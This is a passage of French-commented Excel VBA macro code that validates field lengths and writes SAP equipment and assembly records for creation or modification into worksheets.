            '32 niveau de l'|fffd|quipement obl(3)
            var_libel_erreur = var_libel_erreur + test_long(3, var_niveau, "20")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 32).Value = var_niveau
            '33 Reference fournisseur de l'|fffd|quipement obl(25)
            var_libel_erreur = var_libel_erreur + test_long(25, var_ref_four, "22")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 33).Value = var_ref_four
            '34 nom fournisseur de l'|fffd|quipement obl(30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_nom_four, "21")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 34).Value = var_nom_four
            '35 Reference integrateur (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_ref_int, "24")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 35).Value = var_ref_int
            '36 Nom int|fffd|grateur (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_nom_int, "23")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 36).Value = var_nom_int
            '37 Quantit|fffd| de l'|fffd|quipement
            var_libel_erreur = var_libel_erreur + test_long(3, Var_qte, "32")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 37).Value = Var_qte
            '38 Mn|fffd|monique
            '39 Cat|fffd|gorie d'|fffd|quipement
            '40 Code projet (produit fabriqu|fffd|
            '41 Modele Gmao
            '42 Famille GMAO obl  30
            var_libel_erreur = var_libel_erreur + test_long(6, var_code_famille, "25")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 42).Value = var_code_famille
            '43 Capacit|fffd| GMAO
            '44 Alimentation GMAO
            '45 A Maintenir 1
            var_libel_erreur = var_libel_erreur + test_long(1, var_maintenir, "27")
            ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, i + 45).Value = var_maintenir
            '46 UET Fabrication
            '47 Dessin|fffd| par
            '48 Indice de l'inventaire
            '49 Date de l'indice
            '50 Responsable de l'indice
            '51 Num|fffd|ro de la pi|fffd|ce produit 1
            '52 Indice de la piece produit 1
            '53 Num|fffd|ro de la pi|fffd|ce produit 2
            '54 Indice de la piece produit 2
            '55 Num|fffd|ro de la pi|fffd|ce produit 3
            '56 Indice de la piece produit 3
            '57 Num|fffd|ro de la pi|fffd|ce produit 4
            '58 Indice de la piece produit 4
            'point de pose
            If var_pt = vbNullString Then var_libel_erreur = var_libel_erreur + "(1)"
            
            'Recherche libell|fffd| DIVISION
            var_temp = Libelle_Code_Process("DIV", var_div, var_div)

            If var_temp = vbNullString Then var_libel_erreur = var_libel_erreur + "(3)"

            If var_libel_erreur <> vbNullString Then
                var_libel_erreur = Libel_Nok & " " + var_libel_erreur
                ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, 2).Value = var_libel_erreur
                ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = var_libel_erreur
                nb_NOK = nb_NOK + 1
            Else
               ThisWorkbook.Sheets(shGE_ACreer).Cells(iEcriture, 2).Value = Libel_Ok
            End If
            iEcriture = iEcriture + 1
        End If 'test var etat
    End If
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub

Sub GE_modifier()
    'Traitement de la preparation des Groupes d'Ensembles pour SAP
    Dim i As Integer, var_loc  As Integer
    Dim var_pt, lib_erreur As String, lg As String
    Dim var_temp As Variant
    Dim OK As Boolean, erreur As Boolean
    
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    i = col_div - 1
    'test si la ligne est un GE sans numero SAP
    Result = Lire_Valeur_Cellule(iDonn|fffd|es, i + 15, shDecoupage)
    var_numsap = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
    If var_numsap = vbNullString Then OK = False Else If VBA.Len(var_numsap) <= 7 And Caracteres_Numeriques(var_numsap) Then OK = True Else OK = False
    
    If Result = "GE" And OK Then
        erreur = False
        lib_erreur = Libel_Nok & " "
        'reconstitution du poste technique
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        var_loc = i + 2
        Do
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then var_pt = var_pt + "_" + Result
            var_loc = var_loc + 1
        Loop Until var_loc = i + 7
        Result = var_pt
        Lire_ligne (i)
        
        If var_ref_four = vbNullString Then var_ref_four = "*****"
        If var_sufixe <> vbNullString Then var_ref_four = var_ref_four + "_" + var_sufixe
        If var_nom_four = vbNullString Then var_nom_four = "****"
            
        'ecriture fichier
        If var_etat <> "T" And var_etat <> "S" And var_etat <> "TS" Then
            var_libel_erreur = vbNullString
            i = 2
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, 1).Value = Num_ligne
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 1).Value = var_div ' 1 division
            ' 2 langue
            lg = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(22, 16).Value)
            lg = VBA.Mid(lg, 1, 2)
            Select Case lg
                Case "FR", "ES", "GB", "SL", "PT", "RU", "RO"
    
                Case Else
                    lg = "FR"
            End Select
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 2).Value = lg
            ' 3 num Sap
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 3).Value = var_numsap
            ' 4 Num licence
            
            ' 5 Point de pose sur Poste technique
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 5).Value = var_pt
            If VBA.Len(var_pt) > lg_pt Then var_libel_erreur = var_libel_erreur + "(5)"
            ' 6 PP-EQUIP
            ' 7 PP-Licence
            ' 8 Enlever Ref four
            ' 9 Enlever statut Ref
            '10 Num position 'N|fffd| Position(4)
            var_libel_erreur = var_libel_erreur + test_long(4, var_position, "7")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 10).Value = var_position
            '11 Groupe Autorisation
            '12 Cat|fffd|gorie d'|fffd|quipement
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 12).Value = "N"
            '13 Libelle fonctionnel de l'|fffd|quipement obl(40)
            If var_libel_fonct = vbNullString Then var_libel_erreur = var_libel_erreur + "(2)"
            var_libel_erreur = var_libel_erreur + test_long(40, var_libel_fonct, "10")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 13).Value = var_libel_fonct
            '14 Num s|fffd|rie Fabricant (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_num_serie, "11")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 14).Value = var_num_serie
            '15 Type equipement
            '16 Num inventaire (25)
            var_libel_erreur = var_libel_erreur + test_long(25, var_matricule, "13")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 16).Value = var_matricule
            '17 code ABC
            '18 Localisation
            '19 Local
            '20 Centre de cout
            '21 Immobilisation principale (12)
            var_libel_erreur = var_libel_erreur + test_long(12, var_immo_princ, "15")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 21).Value = var_immo_princ
            '22 Immobilisation subsidiaire(4)
            var_libel_erreur = var_libel_erreur + test_long(4, var_immo_sec, "16")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 22).Value = var_immo_sec
            '23 Valeur d'acquisition
            '24 Devise d'acquisition
            '25 Date c'acquisition
            '26 Date de D|fffd|but de garantie fournisseur
            '27 Date de fin de garantir fournisseur
            '28 Repere   (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_repere_comp, "17")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 28).Value = var_repere_comp
            '29 Num licence 20)
            var_libel_erreur = var_libel_erreur + test_long(20, var_licence, "20")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 29).Value = var_licence
            '30 Code Mabec
            var_libel_erreur = var_libel_erreur + test_long(20, var_sacim, "26")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 30).Value = var_sacim
            '31 Libelle Mat|fffd|riel de l'|fffd|quipement obl(30)
            If var_libel_four = vbNullString Then var_libel_erreur = var_libel_erreur + "(4)"
            var_libel_erreur = var_libel_erreur + test_long(30, var_libel_four, "19")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 31).Value = var_libel_four
            '32 niveau de l'|fffd|quipement obl(3)
            var_libel_erreur = var_libel_erreur + test_long(3, var_niveau, "20")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 32).Value = var_niveau
            '33 Reference fournisseur de l'|fffd|quipement obl(25)
            var_libel_erreur = var_libel_erreur + test_long(25, var_ref_four, "22")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 33).Value = var_ref_four
            '34 nom fournisseur de l'|fffd|quipement obl(30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_nom_four, "21")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 34).Value = var_nom_four
            '35 Reference integrateur (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_ref_int, "24")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 35).Value = var_ref_int
            '36 Nom int|fffd|grateur (30)
            var_libel_erreur = var_libel_erreur + test_long(30, var_nom_int, "23")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 36).Value = var_nom_int
            '37 Quantit|fffd| de l'|fffd|quipement
            var_libel_erreur = var_libel_erreur + test_long(3, Var_qte, "32")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 37).Value = Var_qte
            '38 Mn|fffd|monique
            '39 Cat|fffd|gorie d'|fffd|quipement
            '40 Code projet (produit fabriqu|fffd|
            '41 Modele Gmao
            '42 Famille GMAO obl  30
            var_libel_erreur = var_libel_erreur + test_long(6, var_code_famille, "25")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 42).Value = var_code_famille
            '43 Capacit|fffd| GMAO
            '44 Alimentation GMAO
            '45 A Maintenir 1
            var_libel_erreur = var_libel_erreur + test_long(1, var_maintenir, "27")
            ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, i + 45).Value = var_maintenir
            '46 UET Fabrication
            '47 Dessin|fffd| par
            '48 Indice de l'inventaire
            '49 Date de l'indice
            '50 Responsable de l'indice
            '51 Num|fffd|ro de la pi|fffd|ce produit 1
            '52 Indice de la piece produit 1
            '53 Num|fffd|ro de la pi|fffd|ce produit 2
            '54 Indice de la piece produit 2
            '55 Num|fffd|ro de la pi|fffd|ce produit 3
            '56 Indice de la piece produit 3
            '57 Num|fffd|ro de la pi|fffd|ce produit 4
            '58 Indice de la piece produit 4
            'point de pose
            If var_pt = vbNullString Then var_libel_erreur = var_libel_erreur + "(1)"
            
            'Recherche libell|fffd| DIVISION
            var_temp = Libelle_Code_Process("DIV", var_div, var_div)
    
            If var_temp = vbNullString Then var_libel_erreur = var_libel_erreur + "(3)"
    
            If var_libel_erreur <> vbNullString Then
                var_libel_erreur = Libel_Nok & " " + var_libel_erreur
                ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, 2).Value = var_libel_erreur
                ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = var_libel_erreur
                nb_NOK = nb_NOK + 1
            Else
               ThisWorkbook.Sheets(shGE_AModifier).Cells(iEcriture, 2).Value = Libel_Ok
            End If
            iEcriture = iEcriture + 1
        End If 'test var etat
    End If
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub


Sub Ens_creer()
    'Traitement de la preparation des Groupes d'Ensembles pour SAP
    Dim i As Integer, W As Integer, var_loc As Integer
    Dim var_pt, lib_erreur As String, lg As String, Niveau As String, type_objet As String
    Dim var_temp As Variant
    Dim OK As Boolean, erreur As Boolean
        
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    Niveau = Lire_Valeur_Cellule(iDonn|fffd|es, 16, shDecoupage)
    type_objet = Lire_Valeur_Cellule(iDonn|fffd|es, 17, shDecoupage)
    i = col_div - 1
    'test si la ligne est un GE sans numero SAP
    If Niveau = "0" Then
        i = col_div - 1
        mem_pt_ge = vbNullString 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        'mem_num_sap_ge = vbnullstring 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        ' calcul du point de pose
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        var_loc = i + 2
        Do
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then var_pt = var_pt + "_" + Result
            var_loc = var_loc + 1
        Loop Until var_loc = i + 7
        Select Case type_objet
        Case "E"
            ' cas du E pose sur un Pt
            ' Si objet =E ->  ???
            'mem_pt_ge = vbnullstring 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
            mem_num_sap_ge = vbNullString 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        Case "GE"
            ' cas du GE pose sur un Pt
            ' objet =GE
            mem_pt_ge = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
            mem_num_sap_ge = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        End Select
    Else
        ' Cas de l'|fffd|quipement pose sur un GE
        ' contr|fffd|ler type objet
    End If
    '******************************************************
    Result = Lire_Valeur_Cellule(iDonn|fffd|es, i + 15, shDecoupage)
    var_numsap = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
    If var_numsap = vbNullString Then OK = True Else If VBA.Len(var_numsap) > 7 And Not Caracteres_Numeriques(var_numsap) Then OK = True Else OK = False
    If Result = "E" And OK Then
        erreur = False
        lib_erreur = Libel_Nok & " "
        'reconstitution du poste technique
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        var_loc = i + 2
        Do
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then var_pt = var_pt + "_" + Result
            var_loc = var_loc + 1
        Loop Until var_loc > i + 7
        Result = var_pt
        Lire_ligne (i)
        If var_ref_four = vbNullString Then var_ref_four = "*****"
        If var_sufixe <> vbNullString Then var_ref_four = var_ref_four + "_" + var_sufixe
        If var_nom_four = vbNullString Then var_nom_four = "****"
        
        'ecriture fichier
        If var_etat <> "T" And var_etat <> "S" And var_etat <> "TS" Then
              var_libel_erreur = vbNullString
              i = 2
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, 1).Value = Num_ligne
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 1).Value = var_div ' 1 division
              ' 2 langue
              lg = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(22, 16).Value)
              lg = VBA.Mid(lg, 1, 2)
              Select Case lg
                Case "FR", "ES", "GB", "SL", "PT", "RU", "RO"
    
                Case Else
                    lg = "FR"
              End Select
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 2).Value = lg
              ' 3 num Sap
              ' 4 Num licence
              
              ' 5 Point de pose sur Poste technique
              'ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 5).Value = var_pt
              ' 6 PP-EQUIP
              ' 7 PP-Licence
              If Niveau = "0" Then  ' 5 Point de pose sur Poste technique
                    ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 5).Value = var_pt
              Else
                If VBA.Len(mem_num_sap_ge) > 7 Then    ' 7 PP-Licence
                    ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 7).Value = mem_num_sap_ge 'libel_prefixe + mem_num_ge
                Else                                ' 6 PP-EQUIP
                    ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 6).Value = mem_num_sap_ge
                End If
              End If
              If VBA.Len(var_pt) > lg_pt Then var_libel_erreur = var_libel_erreur + "(5)"
              ' 8 Enlever Ref four
              ' 9 Enlever statut Ref
              '10 Num position 'N|fffd| Position(4)
              W = VBA.InStr(1, var_div, "RE00")
              If W <> 0 Then var_categorie = "R": var_groupe_autor = "SEQR" Else var_categorie = "N": var_groupe_autor = vbNullString
              var_libel_erreur = var_libel_erreur + test_long(4, var_position, "7")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 10).Value = var_position
              '11 Groupe Autorisation
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 11).Value = var_groupe_autor
              '12 Cat|fffd|gorie d'|fffd|quipement
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 12).Value = var_categorie
              '13 Libelle fonctionnel de l'|fffd|quipement obl(40)
              If var_libel_fonct = vbNullString Then var_libel_erreur = var_libel_erreur + "(2)"
              var_libel_erreur = var_libel_erreur + test_long(40, var_libel_fonct, "10")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 13).Value = var_libel_fonct
              '14 Num s|fffd|rie Fabricant (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_num_serie, "11")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 14).Value = var_num_serie
              '15 Type equipement
              '16 Num inventaire (25)
              var_libel_erreur = var_libel_erreur + test_long(25, var_matricule, "13")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 16).Value = var_matricule
              '17 code ABC
              '18 Localisation
              '19 Local
              '20 Centre de cout
              '21 Immobilisation principale (12)
              var_libel_erreur = var_libel_erreur + test_long(12, var_immo_princ, "15")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 21).Value = var_immo_princ
              '22 Immobilisation subsidiaire(4)
              var_libel_erreur = var_libel_erreur + test_long(4, var_immo_sec, "16")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 22).Value = var_immo_sec
              '23 Valeur d'acquisition
              '24 Devise d'acquisition
              '25 Date d'acquisition
              '26 Date de D|fffd|but de garantie fournisseur
              '27 Date de fin de garantir fournisseur
              '28 Repere   (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_repere_comp, "17")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 28).Value = var_repere_comp
              '29 Num licence 20)
              
              prefixe = libel_prefixe + Num_ligne
              var_libel_erreur = var_libel_erreur + test_long(20, prefixe, "18")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 29).Value = prefixe
              ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 18).Value = prefixe
              '30 Code Mabec
              var_libel_erreur = var_libel_erreur + test_long(20, var_sacim, "26")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 30).Value = var_sacim
              '31 Libelle Mat|fffd|riel de l'|fffd|quipement obl(30)
              If var_libel_four = vbNullString Then var_libel_erreur = var_libel_erreur + "(4)"
              var_libel_erreur = var_libel_erreur + test_long(30, var_libel_four, "19")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 31).Value = var_libel_four
              '32 niveau de l'|fffd|quipement obl(3)
              var_libel_erreur = var_libel_erreur + test_long(3, var_niveau, "20")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 32).Value = var_niveau
              '33 Reference fournisseur de l'|fffd|quipement obl(25)
              var_libel_erreur = var_libel_erreur + test_long(25, var_ref_four, "22")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 33).Value = var_ref_four
              '34 nom fournisseur de l'|fffd|quipement obl(30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_nom_four, "21")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 34).Value = var_nom_four
              '35 Reference integrateur (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_ref_int, "24")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 35).Value = var_ref_int
              '36 Nom int|fffd|grateur (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_nom_int, "23")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 36).Value = var_nom_int
              '37 Quantit|fffd| de l'|fffd|quipement
              var_libel_erreur = var_libel_erreur + test_long(3, Var_qte, "32")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 37).Value = Var_qte
              '38 Mn|fffd|monique
              '39 Cat|fffd|gorie d'|fffd|quipement
              '40 Code projet (produit fabriqu|fffd|
              '41 Modele Gmao
              '42 Famille GMAO obl  30
              var_libel_erreur = var_libel_erreur + test_long(6, var_code_famille, "25")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 42).Value = var_code_famille
              '43 Capacit|fffd| GMAO
              '44 Alimentation GMAO
              '45 A Maintenir 1
              var_libel_erreur = var_libel_erreur + test_long(1, var_maintenir, "27")
              ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, i + 45).Value = var_maintenir
              '46 UET Fabrication
              '47 Dessin|fffd| par
              '48 Indice de l'inventaire
              '49 Date de l'indice
              '50 Responsable de l'indice
              '51 Num|fffd|ro de la pi|fffd|ce produit 1
              '52 Indice de la piece produit 1
              '53 Num|fffd|ro de la pi|fffd|ce produit 2
              '54 Indice de la piece produit 2
              '55 Num|fffd|ro de la pi|fffd|ce produit 3
              '56 Indice de la piece produit 3
              '57 Num|fffd|ro de la pi|fffd|ce produit 4
              '58 Indice de la piece produit 4
              'point de pose
              If var_pt = vbNullString Then var_libel_erreur = var_libel_erreur + "(1)"
              
              'Recherche libell|fffd| DIVISION
              var_temp = Libelle_Code_Process("DIV", var_div, var_div)
              
              If var_temp = vbNullString Then var_libel_erreur = var_libel_erreur + "(3)"
    
              If var_libel_erreur <> vbNullString Then
                  var_libel_erreur = Libel_Nok & " " + var_libel_erreur
                  ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, 2).Value = var_libel_erreur
                  ThisWorkbook.Sheets(shDecoupage).Cells(iDonn|fffd|es, 2).Value = var_libel_erreur
                  nb_NOK = nb_NOK + 1
              Else
                 ThisWorkbook.Sheets(shENS_ACreer).Cells(iEcriture, 2).Value = Libel_Ok
              End If
              iEcriture = iEcriture + 1
          End If 'test var etat
      End If
      ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub

Sub Ens_modifier()
    'Traitement de la preparation des Groupes d'Ensembles pour SAP
    Dim i As Integer, W As Integer, var_loc As Integer
    Dim var_pt, lib_erreur As String, lg As String, Niveau As String, type_objet As String
    Dim var_temp As Variant
    Dim OK As Boolean, erreur As Boolean
        
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    Niveau = Lire_Valeur_Cellule(iDonn|fffd|es, 16, shDecoupage)
    type_objet = Lire_Valeur_Cellule(iDonn|fffd|es, 17, shDecoupage)
    i = col_div - 1
    'test si la ligne est un GE sans numero SAP
    If Niveau = "0" Then
        i = col_div - 1
        mem_pt_ge = vbNullString 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        'mem_num_sap_ge = vbnullstring 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        ' calcul du point de pose
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        var_loc = i + 2
        Do
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then var_pt = var_pt + "_" + Result
            var_loc = var_loc + 1
        Loop Until var_loc = i + 7
        If type_objet = "E" Then
            ' cas du E pose sur un Pt
            ' Si objet =E ->  ???
            'mem_pt_ge = vbnullstring 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
            mem_num_sap_ge = vbNullString 'Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        ElseIf type_objet = "GE" Then
            ' cas du GE pose sur un Pt
            ' objet =GE
            mem_pt_ge = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
            mem_num_sap_ge = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
        End If
    Else
        ' Cas de l'|fffd|quipement pose sur un GE
        ' contr|fffd|ler type objet
    End If
    '******************************************************
    Result = Lire_Valeur_Cellule(iDonn|fffd|es, i + 15, shDecoupage)
    var_numsap = Lire_Valeur_Cellule(iDonn|fffd|es, i + 16, shDecoupage)
    If var_numsap = vbNullString Then OK = True Else If VBA.Len(var_numsap) < 8 And Caracteres_Numeriques(var_numsap) Then OK = True Else OK = False
    If Result = "E" And OK Then
        erreur = False
        lib_erreur = Libel_Nok & " "
        'reconstitution du poste technique
        var_pt = Lire_Valeur_Cellule(iDonn|fffd|es, i + 1, shDecoupage)
        For var_loc = i + 2 To i + 7
            Result = Lire_Valeur_Cellule(iDonn|fffd|es, var_loc, shDecoupage)
            If Result <> vbNullString And Result <> "---" And Result <> "----" Then
                var_pt = var_pt + "_" + Result
            End If
        Next
        Result = var_pt
        Lire_ligne (i)
        If var_ref_four = vbNullString Then var_ref_four = "*****"
        If var_sufixe <> vbNullString Then var_ref_four = var_ref_four + "_" + var_sufixe
        If var_nom_four = vbNullString Then var_nom_four = "****"
        
        'ecriture fichier
        If var_etat <> "T" And var_etat <> "S" And var_etat <> "TS" Then
              var_libel_erreur = vbNullString
              i = 2
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, 1).Value = Num_ligne
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 1).Value = var_div ' 1 division
              ' 2 langue
              lg = VBA.UCase(ThisWorkbook.Sheets(shCde_Simon).Cells(22, 16).Value)
              lg = VBA.Mid(lg, 1, 2)
              Select Case lg
                Case "FR", "ES", "GB", "SL", "PT", "RU", "RO"
                Case Else
                    lg = "FR"
              End Select
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 2).Value = lg
              ' 3 num Sap
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 3).Value = var_numsap
              ' 4 Num licence
              ' 5 Point de pose sur Poste technique
              'ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 5).Value = var_pt
              ' 6 PP-EQUIP
              ' 7 PP-Licence
              If Niveau = "0" Then  ' 5 Point de pose sur Poste technique
                    ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 5).Value = var_pt
              Else
                If VBA.Len(mem_num_sap_ge) <= 7 Then     ' 6 PP-EQUIP
                    ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 6).Value = mem_num_sap_ge 'libel_prefixe + mem_num_ge
                Else                                ' 7 PP-Licence
                    ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 7).Value = mem_num_sap_ge
                End If
              End If
              If VBA.Len(var_pt) > lg_pt Then var_libel_erreur = var_libel_erreur + "(5)"
              ' 8 Enlever Ref four
              ' 9 Enlever statut Ref
              '10 Num position 'N|fffd| Position(4)
              W = VBA.InStr(1, var_div, "RE00")
              If W <> 0 Then var_categorie = "R": var_groupe_autor = "SEQR" Else var_categorie = "N": var_groupe_autor = vbNullString
              var_libel_erreur = var_libel_erreur + test_long(4, var_position, "7")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 10).Value = var_position
              '11 Groupe Autorisation
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 11).Value = var_groupe_autor
              '12 Cat|fffd|gorie d'|fffd|quipement
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 12).Value = var_categorie
              '13 Libelle fonctionnel de l'|fffd|quipement obl(40)
              If var_libel_fonct = vbNullString Then var_libel_erreur = var_libel_erreur + "(2)"
              var_libel_erreur = var_libel_erreur + test_long(40, var_libel_fonct, "10")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 13).Value = var_libel_fonct
              '14 Num s|fffd|rie Fabricant (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_num_serie, "11")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 14).Value = var_num_serie
              '15 Type equipement
              '16 Num inventaire (25)
              var_libel_erreur = var_libel_erreur + test_long(25, var_matricule, "13")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 16).Value = var_matricule
              '17 code ABC
              '18 Localisation
              '19 Local
              '20 Centre de cout
              '21 Immobilisation principale (12)
              var_libel_erreur = var_libel_erreur + test_long(12, var_immo_princ, "15")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 21).Value = var_immo_princ
              '22 Immobilisation subsidiaire(4)
              var_libel_erreur = var_libel_erreur + test_long(4, var_immo_sec, "16")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 22).Value = var_immo_sec
              '23 Valeur d'acquisition
              '24 Devise d'acquisition
              '25 Date d'acquisition
              '26 Date de D|fffd|but de garantie fournisseur
              '27 Date de fin de garantir fournisseur
              '28 Repere   (30)
              var_libel_erreur = var_libel_erreur + test_long(30, var_repere_comp, "17")
              ThisWorkbook.Sheets(shENS_AModifier).Cells(iEcriture, i + 28).Value = var_repere_comp
              '29 Num licence 20)
              var_libel_erreur = var_libel_erreur + test_long(20, var_licence, "20")
